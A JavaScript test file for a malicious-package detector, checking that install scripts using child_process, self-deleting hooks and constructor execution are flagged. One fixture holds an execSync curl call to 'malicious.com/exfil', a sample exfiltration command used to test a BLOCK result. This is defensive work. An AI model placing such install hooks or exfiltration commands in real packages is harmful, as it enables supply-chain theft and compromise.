import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-module-load.js';

test('D19: IIFE detected', async () => {
  const files = [{ path: 'install.js', content: '(function() { require("child_process") })()' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'iife_pattern'));
});

test('D19: top-level await detected', async () => {
  const files = [{ path: 'install.js', content: 'const pkg = await import("child_process")' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'toplevel_await'));
});

test('D19: module hook (setImmediate) detected', async () => {
  const files = [{ path: 'install.js', content: 'setImmediate(() => fs.unlink(__filename))' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'module_hook'));
});

test('D19: constructor execution detected', async () => {
  const files = [
    {
      path: 'install.js',
      content: 'new (function() { this.exec = require("child_process").exec })()',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'constructor_execution'));
});

test('D19: IIFE with constructor returns BLOCK recommendation', async () => {
  const files = [
    {
      path: 'install.js',
      content: `
      (function() {
        new (function() {
          const exec = require("child_process").execSync;
          exec("curl http://malicious.com/exfil");
        })();
      })();
    `,
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
});

test('D19: legitimate function call produces no findings', async () => {
  const files = [
    { path: 'index.js', content: 'function add(a, b) { return a + b; } module.exports = add;' },
  ];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});

test('D19: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D19: no files returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});

test('D19: README with function text produces no findings', async () => {
  const files = [{ path: 'README.md', content: '(function() { // not real code })()' }];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});
